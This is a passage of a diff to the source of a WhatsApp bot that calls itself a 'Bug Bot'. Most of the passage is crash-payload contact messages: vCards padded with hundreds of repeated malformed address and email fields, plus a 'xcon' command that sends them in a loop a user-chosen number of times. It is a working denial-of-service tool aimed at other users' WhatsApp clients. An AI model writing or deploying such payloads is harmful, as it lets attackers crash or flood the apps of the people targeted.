karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fakeContacts = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️ ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Neptune.exe ☣️\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 NepBotzInc.sendContact(m.chat, global.owner, fakeContacts)
 }
 }
@@ -8945,7 +8944,7 @@ case 'xcon': {
 if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-const fakecontect = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Xeon Ezy☣️\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 